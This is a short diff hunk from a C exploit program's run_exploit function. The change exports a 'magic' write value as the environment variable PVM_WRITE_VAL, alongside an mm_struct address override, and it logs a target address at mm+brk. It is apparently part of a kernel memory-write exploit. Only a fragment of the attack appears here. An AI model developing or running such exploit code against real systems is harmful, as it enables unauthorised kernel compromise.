@@ -956,6 +956,9 @@ int run_exploit(int argc, char **argv) {
         char mmhex[32];
         snprintf(mmhex, sizeof(mmhex), "%zx", last_mm_struct);
         setenv("MM_OVERRIDE", mmhex, 1);
+        char maghex[32];
+        snprintf(maghex, sizeof(maghex), "%llx", (unsigned long long)magic);
+        setenv("PVM_WRITE_VAL", maghex, 1);
         uintptr_t vt = last_mm_struct + 0x148;
         pr_info("VERIFY: target=%016zx (mm+brk) value=%016llx\n",
                 vt, (unsigned long long)magic);
